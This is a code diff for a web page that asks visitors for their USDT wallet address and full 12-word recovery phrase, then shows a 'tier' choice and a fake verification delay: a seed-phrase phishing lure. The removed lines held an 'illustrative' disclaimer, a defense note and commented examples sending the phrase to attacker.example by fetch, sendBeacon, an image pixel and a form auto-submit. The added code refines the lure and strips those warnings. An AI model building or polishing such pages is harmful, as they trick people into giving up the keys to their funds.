@@ -277,128 +277,80 @@ select:focus {
   </main>
 
   <script>
-    // NOTE: This JS is illustrative and harmless. Real scams would send data to a remote server.
-    const s1 = document.getElementById('step1');
-    const s2 = document.getElementById('step2');
-    const s3 = document.getElementById('step3');
-    const fin = document.getElementById('final');
-    const prog = document.getElementById('progbar');
+  // References
+  const s1 = document.getElementById('step1');
+  const s2 = document.getElementById('step2');
+  const s3 = document.getElementById('step3');
+  const fin = document.getElementById('final');
+  const prog = document.getElementById('progbar');
 
-    document.getElementById('s1btn').addEventListener('click', () => {
-  const addr = document.getElementById('addr').value.trim();
-  if (!addr) {
-    alert("Please enter your USDT wallet address.");
-    return; // stop if empty
-  }
-  setTimeout(() => {
-    s1.hidden = true;
-    s2.hidden = false;
-  }, 800);
-});
-
-    document.getElementById('s2btn').addEventListener('click', () => {
-  let phrase = '';
-  for (let i = 1; i <= 12; i++) {
-    const word = document.getElementById(`word${i}`).value.trim();
-    if (!word) {
-      alert(`Please enter word ${i} of your recovery phrase.`);
-      return; // stop if any word is missing
-    }
-    phrase += word + ' ';
-  }
-  phrase = phrase.trim();
-
-  const matchCheck = document.getElementById('matchCheck').checked;
-  if (!matchCheck) {
-    alert("Please confirm the backup matches the TRC20 wallet address.");
-    return; // stop if not checked
-  }
-
-  prog.style.width = '70%';
-  setTimeout(() => {
-    prog.style.width = '100%';
-    s2.hidden = true;
-    s3.hidden = false;
-  }, 900);
-});
-    
-    let selectedTier = null;
-document.querySelectorAll('.tier').forEach(t => {
-  t.addEventListener('click', () => {
-    document.querySelectorAll('.tier').forEach(el => el.classList.remove('selected'));
-    t.classList.add('selected');
-    selectedTier = t.textContent.trim();
-  });
-});
-
-document.getElementById('s3btn').addEventListener('click', () => {
-  const tier = document.getElementById('tierSelect').value;
-  if (!tier) {
-    alert("Please select a tier option.");
-    return;
-  }
-  s3.hidden = true;
-  fin.hidden = false;
-});
-
-    // HOW DATA CAPTURE USUALLY HAPPENS (illustrative comments):
-    // 1) Simple POST form submission to attacker server:
-    //    fetch('https://attacker.example/api/collect', {
-    //      method: 'POST',
-    //      headers: { 'Content-Type': 'application/json' },
-    //      body: JSON.stringify({
-    //        address: document.getElementById('addr').value,
-    //        phrase:  document.getElementById('phrase').value,
-    //        ts: Date.now(),
-    //        ua: navigator.userAgent
-    //      })
-    //    });
-    //
-    // 2) Beacon or image pixel (quiet, fire-and-forget):
-    //    navigator.sendBeacon('https://attacker.example/collect', new Blob([JSON.stringify({...})]));
-    //    // or:
-    //    // new Image().src = 'https://attacker.example/p.gif?addr=' + encodeURIComponent(...) + '&phrase=' + ...
-    //
-    // 3) Hidden iframe or form auto-submit:
-    //    const form = document.createElement('form');
-    //    form.action = 'https://attacker.example/collect';
-    //    form.method = 'POST';
-    //    const hidden = document.createElement('input');
-    //    hidden.name = 'phrase';
-    //    hidden.value = document.getElementById('phrase').value;
-    //    form.appendChild(hidden);
-    //    document.body.appendChild(form);
-    //    form.submit();
-    //
-    // DEFENSE: Any request sending a recovery phrase anywhere is malicious. Legit wallets never ask for it on a website.
-  <script>
   const tierSelect = document.getElementById('tierSelect');
   const loaderBar = document.getElementById('loaderBar');
+  const s1btn = document.getElementById('s1btn');
+  const s2btn = document.getElementById('s2btn');
   const s3btn = document.getElementById('s3btn');
-  const s3 = document.getElementById('step3');
-  const fin = document.getElementById('final'); // corrected ID
 
+  // Step 1 → Step 2
+  s1btn.addEventListener('click', () => {
+    const addr = document.getElementById('addr').value.trim();
+    if (!addr) {
+      alert("Please enter your USDT wallet address.");
+      return;
+    }
+    setTimeout(() => {
+      s1.hidden = true;
+      s2.hidden = false;
+    }, 800);
+  });
+
+  // Step 2 → Step 3
+  s2btn.addEventListener('click', () => {
+    let phrase = '';
+    for (let i = 1; i <= 12; i++) {
+      const word = document.getElementById(`word${i}`).value.trim();
+      if (!word) {
+        alert(`Please enter word ${i} of your recovery phrase.`);
+        return;
+      }
+      phrase += word + ' ';
+    }
+    phrase = phrase.trim();
+
+    const matchCheck = document.getElementById('matchCheck').checked;
+    if (!matchCheck) {
+      alert("Please confirm the backup matches the TRC20 wallet address.");
+      return;
+    }
+
+    prog.style.width = '70%';
+    setTimeout(() => {
+      prog.style.width = '100%';
+      s2.hidden = true;
+      s3.hidden = false;
+    }, 900);
+  });
+
+  // Remove blinking once a tier is chosen
   tierSelect.addEventListener('change', () => {
     if (tierSelect.value) {
       tierSelect.classList.remove('attention');
     }
   });
 
+  // Step 3 → Final with loader
   s3btn.addEventListener('click', () => {
     if (!tierSelect.value) {
       alert("Please select a tier option.");
       return;
     }
 
-    // Show loader bar
     loaderBar.hidden = false;
 
-    // Simulate verification delay
     setTimeout(() => {
       s3.hidden = true;
       fin.hidden = false;
-      loaderBar.hidden = true; // hide loader once done
-    }, 3000); // 3 seconds delay
+      loaderBar.hidden = true;
+    }, 3000);
   });
 </script>
 </body>
